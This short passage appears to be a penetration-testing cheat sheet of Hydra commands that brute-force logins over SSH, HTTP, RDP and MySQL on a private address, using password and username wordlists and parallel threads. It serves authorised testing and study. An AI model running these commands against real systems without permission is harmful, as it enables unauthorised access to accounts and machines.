hydra -l user -P passwords.txt ssh://192.168.1.10
hydra -l admin -P passwords.txt http-get://192.168.1.10
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
hydra -l root -P passwords.txt mysql://192.168.1.10
**Parallel Threads**
hydra -t 4 -l user -P passwords.txt ssh://192.168.1.10


